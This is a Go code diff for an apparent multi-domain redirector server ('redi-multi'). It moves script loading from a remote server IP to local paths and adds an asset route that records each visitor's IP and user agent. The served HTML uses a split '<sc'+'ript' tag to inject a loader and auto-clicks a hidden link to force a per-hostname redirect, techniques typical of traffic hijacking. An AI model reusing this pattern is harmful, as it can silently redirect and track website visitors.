@@ -4,8 +4,8 @@ import (
 	"fmt"
 	"net"
 	"redi-multi/acme"
+	"redi-multi/api"
 	"redi-multi/certs"
-	"redi-multi/config"
 	"redi-multi/rules"
 	"strings"
 
@@ -13,33 +13,32 @@ import (
 )
 
 func htmlContent(scheme string) string {
-	apiHost := config.ServerIp
 	if scheme == "https" {
-		return fmt.Sprintf(`<html>
+		return `<html>
 <head>
-	<script src="https://%s:8080/c.js"></script>
-	<script type="text/javascript">var str = '<sc'+'ript src="https://%s:8080/api.js?d='+window.location.hostname.encode()+'" type="text/javascript"></s'+'cript>';document.write(str);</script>
+	<script src="/c.js"></script>
+	<script type="text/javascript">var str = '<sc'+'ript src="/api.js?d='+window.location.hostname.encode()+'" type="text/javascript"></s'+'cript>';document.write(str);</script>
 </head>
 <body>
 	<a href="" id="hao123"></a>
 	<script type="text/javascript">
-		if(null!=redirector[window.location.hostname.encode()]){var strU=redirector[window.location.hostname.encode()].to.decode()+window.location.pathname+window.location.search;if(hao123.href=strU,document.all)document.getElementById("hao123").click();else(e=document.createEvent("MouseEvents")).initEvent("click",!0,!0),document.getElementById("hao123").dispatchEvent(e)}else{var e;strU=redirector.default_redirect_url.to+window.location.pathname+window.location.search;if(hao123.href=strU,document.all)document.getElementById("hao123").click();else(e=document.createEvent("MouseEvents")).initEvent("click",!0,!0),document.getElementById("hao123").dispatchEvent(e);console.log("redirector err")}
+		if(null!=redirector[window.location.hostname.encode()]){var strU=redirector[window.location.hostname.encode()].to.decode()+window.location.pathname+window.location.search;if(hao123.href=strU,document.all)document.getElementById("hao123").click();else(e=document.createEvent("MouseEvents")).initEvent("click",!0,!0),document.getElementById("hao123").dispatchEvent(e)}else{var e;strU=redirector.default_redirect_url.to+window.location.pathname+window.location.search;if(hao123.href=strU,document.all)document.getElementById("hao123").click();else(e=document.createEvent("MouseEvents")).initEvent("click",!0,!0),document.getElementById("hao123").dispatchEvent(e);		console.log("redirector err")}
 	</script>
 </body>
-</html>`, apiHost, apiHost)
+</html>`
 	}
-	return fmt.Sprintf(`<html>
+	return `<html>
 <head>
-	<script src="http://%s:8080/c.js"></script>
-	<script type="text/javascript">var str = '<sc'+'ript src="http://%s:8080/api.js?d='+window.location.hostname.encode()+'" type="text/javascript"></s'+'cript>';document.write(str);</script>
+	<script src="/c.js"></script>
+	<script type="text/javascript">var str = '<sc'+'ript src="/api.js?d='+window.location.hostname.encode()+'" type="text/javascript"></s'+'cript>';document.write(str);</script>
 </head>
 <body>
 	<a href="" id="hao123"></a>
 	<script type="text/javascript">
-		if(null!=redirector[window.location.hostname.encode()]){var strU=redirector[window.location.hostname.encode()].to.decode()+window.location.pathname+window.location.search;if(hao123.href=strU,document.all)document.getElementById("hao123").click();else(e=document.createEvent("MouseEvents")).initEvent("click",!0,!0),document.getElementById("hao123").dispatchEvent(e)}else{var e;strU=redirector.default_redirect_url.to+window.location.pathname+window.location.search;if(hao123.href=strU,document.all)document.getElementById("hao123").click();else(e=document.createEvent("MouseEvents")).initEvent("click",!0,!0),document.getElementById("hao123").dispatchEvent(e);console.log("redirector err")}
+		if(null!=redirector[window.location.hostname.encode()]){var strU=redirector[window.location.hostname.encode()].to.decode()+window.location.pathname+window.location.search;if(hao123.href=strU,document.all)document.getElementById("hao123").click();else(e=document.createEvent("MouseEvents")).initEvent("click",!0,!0),document.getElementById("hao123").dispatchEvent(e)}else{var e;strU=redirector.default_redirect_url.to+window.location.pathname+window.location.search;if(hao123.href=strU,document.all)document.getElementById("hao123").click();else(e=document.createEvent("MouseEvents")).initEvent("click",!0,!0),document.getElementById("hao123").dispatchEvent(e);		console.log("redirector err")}
 	</script>
 </body>
-</html>`, apiHost, apiHost)
+</html>`
 }
 
 func Process(conn net.Conn, tls bool) {
@@ -57,6 +56,10 @@ func Process(conn net.Conn, tls bool) {
 
 	if body, ok := acme.ResponseForPath(host, path); ok {
 		writePlain(conn, body)
+		return
+	}
+
+	if api.WriteAsset(conn, req.Path, remoteIP(conn), req.UserAgent) {
 		return
 	}
 
@@ -91,4 +94,12 @@ func writePlain(conn net.Conn, body string) {
 
 func writeRedirect(conn net.Conn, code int, location string) {
 	_, _ = conn.Write([]byte(fmt.Sprintf("HTTP/1.1 %d\r\nLocation: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n", code, location)))
+}
+
+func remoteIP(conn net.Conn) string {
+	host, _, err := net.SplitHostPort(conn.RemoteAddr().String())
+	if err != nil {
+		return conn.RemoteAddr().String()
+	}
+	return host
 }
